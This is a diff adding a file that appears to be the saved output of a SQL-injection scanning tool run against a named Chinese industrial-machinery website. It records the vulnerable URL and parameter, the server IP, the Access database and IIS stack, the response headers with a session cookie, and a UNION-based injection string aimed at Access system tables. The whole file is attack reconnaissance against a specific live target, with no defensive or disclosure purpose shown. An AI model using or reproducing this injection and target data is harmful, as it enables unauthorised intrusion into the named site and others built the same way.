@@ -1,0 +1,24 @@
+■漏洞信息:============================================================
+ ·URL:http://www.zhisha.cn/show_cp.asp?id=20
+ ·页面标题：反击式破碎机,反击式破碎机价格,反击锤式破碎机
+ ·参数:id=20
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:112.126.93.165
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 10 Sep 2011 12:55:05 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 7312
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDCAAQQSRR=NABNOKJBLGOOCPCCMIPDJAEH; path=/
+Cache-control: private
+
+
+联合查询列数: 总共= 0  显示的列= 0
+联合查询SQL: and 3=8 union select  from MSysAccessObjects
